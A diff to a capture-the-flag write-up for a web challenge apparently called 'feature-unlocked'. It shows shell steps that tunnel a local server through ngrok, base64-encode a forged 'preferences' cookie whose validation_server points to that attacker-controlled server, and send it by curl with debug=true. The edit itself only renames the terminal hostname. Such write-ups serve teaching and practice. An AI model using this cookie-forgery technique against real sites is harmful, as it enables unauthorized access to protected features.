@@ -114,19 +114,19 @@ if __name__ == '__main__':
 
 Then setup a tunnel using ngrok: <br>
 ```bash
-(monkeontheroof㉿DESKTOP-FLPUJ9V)-[~]
+(monkeontheroof㉿kali)-[~]
 └─$ ngrok http 8081
 ```
 
 Base64 encode a new `preferences` cookie including our validation server:<br>
 ```bash
-(monkeontheroof㉿DESKTOP-FLPUJ9V)-[~]
+(monkeontheroof㉿kali)-[~]
 └─$ echo '{"theme": "light", "language": "en", "validation_server": "YOUR_VALIDATION_SERVER_HERE"}' | base64 -w 0
 ```
 
 Then send the GET request to `/release` with `debug` parameter set to `true`, also the modified `preferences` cookie including our malcious validation server: <br>
 ```bash
-┌──(monkeontheroof㉿DESKTOP-FLPUJ9V)-[~]
+┌──(monkeontheroof㉿kali)-[~]
 └─$ curl -s -I https://feature-unlocked-web-challs.csc.tf/release?debug=true -b 'preferences=YOUR_B64_TOKEN'
 
 HTTP/2 200
